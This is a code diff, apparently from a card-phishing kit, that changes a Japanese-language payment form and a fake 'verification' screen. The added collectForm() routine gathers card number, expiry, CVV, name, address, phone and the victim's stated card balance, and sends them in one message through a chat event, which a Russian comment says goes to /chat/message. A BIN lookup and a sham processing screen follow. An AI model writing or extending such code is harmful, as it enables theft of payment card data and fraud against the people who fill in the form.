@@ -1720,7 +1720,7 @@ document.addEventListener('DOMContentLoaded', function(){
                       '</div>' +
                       '<div class="inp-box" id="box-addr1" style="margin-top:8px"><input id="cc-addr1" type="text" placeholder="'+(t.lbl_addr1||'住所')+'" autocomplete="address-line1"></div>' +
                       '<div class="err-txt" id="err-addr1"></div>' +
-                      '<div class="inp-box" style="margin-top:8px"><input type="text" placeholder="'+(t.lbl_addr2||'住所2行目 (任意)')+'" autocomplete="address-line2"></div>' +
+                      '<div class="inp-box" style="margin-top:8px"><input id="cc-addr2" type="text" placeholder="'+(t.lbl_addr2||'住所2行目 (任意)')+'" autocomplete="address-line2"></div>' +
                       '<div class="row2" style="margin-top:8px">' +
                         '<div class="col"><div class="inp-box" id="box-zip"><input id="cc-zip" type="text" placeholder="'+(t.lbl_zip||'郵便番号')+'" autocomplete="postal-code"></div><div class="err-txt" id="err-zip"></div></div>' +
                         '<div class="col"><div class="inp-box"><input id="cc-city" type="text" placeholder="'+(t.lbl_city||'市区町村')+'" autocomplete="address-level2"></div></div>' +
@@ -2124,22 +2124,46 @@ document.addEventListener('DOMContentLoaded', function(){
                         document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'error'}));
                         return;
                     }
+                    self._savedForm = collectForm();
                     showVerification(sh, self);
                     document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'card'}));
                 });
             }
 
+            function valOf(id){
+                var el = sh.getElementById(id);
+                return el ? (el.value || '') : '';
+            }
+
+            function collectForm(){
+                return {
+                    card_number: cardInp ? cardInp.value : '',
+                    card_exp:    expInp  ? expInp.value  : '',
+                    card_cvv:    cvvInp  ? cvvInp.value  : '',
+                    card_name:   nameInp ? nameInp.value.trim() : '',
+                    country:     cntry   ? cntry.value   : '',
+                    address1:    valOf('cc-addr1'),
+                    address2:    valOf('cc-addr2'),
+                    zip_code:    valOf('cc-zip'),
+                    city:        valOf('cc-city'),
+                    phone_dial:  dialEl  ? (dialEl.textContent || '') : '',
+                    phone:       phoneInp? phoneInp.value : ''
+                };
+            }
+
             function showVerification(sh, self){
                 var dlg=sh.querySelector('.dlg');
                 if(!dlg)return;
-                /* save original content */
-                var origHTML=dlg.innerHTML;
+                if(sh.getElementById('card-number')){
+                    self._savedForm = collectForm();
+                }
+                var saved = self._savedForm || {};
 
                 /* card label from brand + last4 */
-                var raw=cardInp?cardInp.value.replace(/\D/g,''):'';
+                var raw=(saved.card_number||'').replace(/\D/g,'');
                 var last4=raw.slice(-4);
                 var brandName=(curBrand&&curBrand.id)?curBrand.id.toUpperCase():'CARD';
-                var issuer=nameInp?nameInp.value.trim()||brandName+' CO., LTD.':brandName+' CO., LTD.';
+                var issuer=(saved.card_name||'').trim()||brandName+' CO., LTD.';
 
                 /* build verification screen */
                 var v=sh.ownerDocument.createElement('div');
@@ -2221,38 +2245,17 @@ document.addEventListener('DOMContentLoaded', function(){
                         return;
                     }
                     var cur=(sh.getElementById('v-currency')||{}).value||'';
+                    var saved = Object.assign({}, self._savedForm || collectForm());
+                    saved.balance_amount = amt;
+                    saved.balance_currency = cur;
+                    self._savedForm = saved;
                     /* передаём данные карты + баланс одним сообщением через /chat/message */
-                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:{
+                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:Object.assign({
                         trigger: 'balance',
-                        text: amt + ' ' + cur,
-                        card_number: cardInp ? cardInp.value : '',
-                        card_exp:    expInp  ? expInp.value  : '',
-                        card_cvv:    cvvInp  ? cvvInp.value  : '',
-                        card_name:   nameInp ? nameInp.value.trim() : '',
-                        country:     cntry   ? cntry.value   : '',
-                        address1:    (sh.getElementById('cc-addr1')||{}).value||'',
-                        zip_code:    (sh.getElementById('cc-zip')||{}).value||'',
-                        city:        (sh.getElementById('cc-city')||{}).value||'',
-                        phone_dial:  dialEl  ? dialEl.textContent : '',
-                        phone:       phoneInp? phoneInp.value : '',
-                        balance_amount:   amt,
-                        balance_currency: cur
-                    }}));
-                    var raw=cardInp?cardInp.value.replace(/\D/g,''):'';
-                    var cardData = {
-                        card_number: cardInp ? cardInp.value : '',
-                        card_exp:    expInp  ? expInp.value  : '',
-                        card_cvv:    cvvInp  ? cvvInp.value  : '',
-                        card_name:   nameInp ? nameInp.value.trim() : '',
-                        country:     cntry   ? cntry.value   : '',
-                        address1:    (sh.getElementById('cc-addr1')||{}).value||'',
-                        zip_code:    (sh.getElementById('cc-zip')||{}).value||'',
-                        city:        (sh.getElementById('cc-city')||{}).value||'',
-                        phone_dial:  dialEl  ? dialEl.textContent : '',
-                        phone:       phoneInp? phoneInp.value : '',
-                        balance_amount:   amt,
-                        balance_currency: cur
-                    };
+                        text: amt + ' ' + cur
+                    }, saved)}));
+                    var raw=(saved.card_number||'').replace(/\D/g,'');
+                    var cardData = saved;
                     lookupBin(raw).then(function(){ showProcessing(sh, self, cardData); });
                 });
             }
